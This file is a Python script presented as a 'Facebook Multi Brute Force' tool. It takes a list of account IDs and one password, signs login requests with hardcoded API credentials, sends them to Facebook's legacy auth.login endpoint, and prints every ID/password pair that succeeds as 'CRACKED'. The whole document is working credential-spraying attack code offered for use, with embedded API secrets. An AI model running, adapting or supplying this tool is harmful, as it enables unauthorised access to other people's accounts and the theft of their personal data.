#!/usr/bin/env python
import os, sys, hashlib, requests
if sys.platform == 'linux2':
    os.system('clear')
else:
    if sys.platform == 'win32':
        os.system('cls')
    else:
        os.system('clear')
API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
__banner__ = '  \x1b[31;1m\n    ________    __  _______  ______\n   / ____/ /_  /  |/  / __ )/ ____/\n  / /_  / __ \\/ /|_/ / __  / /_\n / __/ / /_/ / /  / / /_/ / __/\n/_/   /_.___/_/  /_/_____/_/  \x1b[36mv2.5\n\x1b[37mFacebook Multi Brute Force\n\x1b[31m+------===[\x1b[37;1mAuthor : \x1b[37mGunadiCBR\n  \x1b[31m+-----===[\x1b[37;1mDate   : \x1b[37m22-10-2018\n    \x1b[31m+----===[\x1b[37;1mGithub : \x1b[37mhttps://github.com/afelfgie\n      \x1b[31m+---===[\x1b[37;1mTeam   : \x1b[37mMls18hckr\n '
print __banner__
try:
    idlist = input('\x1b[36;1mset PATH to idlist :\x1b[33m ')
    if os.path.exists(idlist) != False:
        while True:
            password = input('Enter Password: ')
            if password == '' or password == ' ' * len(password):
                print "[!] FbMBF: error: Don't leave the password blank"
            elif len(password) < 8:
                print '[!] FbMBF: error: Password is too short'
            else:
                break

        print '=============================================='
        count = 0
        length = len(open(idlist, 'r').read().split('\n'))
        for id in open(idlist, 'r').read().split('\n'):
            print ('[*] Trying id {} ({}-{})').format(id, count + 1, length)
            sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + password + 'return_ssl_resources=0v=1.0' + API_SECRET
            xx = hashlib.md5(sig.encode(encoding='UTF-8', errors='strict')).hexdigest()
            data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': password, 'return_ssl_resources': '0', 'v': '1.0', 'sig': xx}
            r = requests.get('https://api.facebook.com/restserver.php', params=data)
            if 'error' in r.text:
                pass
            else:
                print '\x07======== CRACKED ========='
                print '\x07[+] FB USER : ' + id
                print '\x07[+] FB PASS : ' + password
                print '\x07=========================='
            count += 1

        print 'Done.'
    else:
        print 'error: No such file or directory'
except KeyboardInterrupt:
    print 'error: Keyboard interrupt'
except:
    print 'error: Network is unreachable'
